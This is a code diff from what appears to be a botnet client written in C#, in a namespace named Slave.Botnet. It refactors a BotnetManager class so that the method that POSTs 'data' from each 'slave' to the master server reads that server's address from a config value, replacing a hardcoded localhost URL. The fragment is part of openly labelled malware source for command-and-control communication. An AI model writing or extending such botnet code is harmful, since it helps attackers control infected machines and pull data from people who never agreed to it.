@@ -1,4 +1,5 @@
-﻿using Newtonsoft.Json;
+using Newtonsoft.Json;
+using Slave.Core;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -12,8 +13,9 @@ namespace Slave.Botnet
 {
     public static class BotnetManager
     {
-        const string masterServerAdress = "http://localhost/botnet/";
-
+        /// <summary>
+        /// Unique (at least trying to be...) slave identifier
+        /// </summary>
         internal static string KEY;
 
         static readonly HttpClient httpClient;
@@ -128,7 +130,7 @@ namespace Slave.Botnet
                 ["data"] = data
             };
 
-            var response = await httpClient.PostAsync(masterServerAdress, new FormUrlEncodedContent(parameters));
+            var response = await httpClient.PostAsync(Config.botnetAdress, new FormUrlEncodedContent(parameters));
             var contents = await response.Content.ReadAsStringAsync();
 
             return contents;
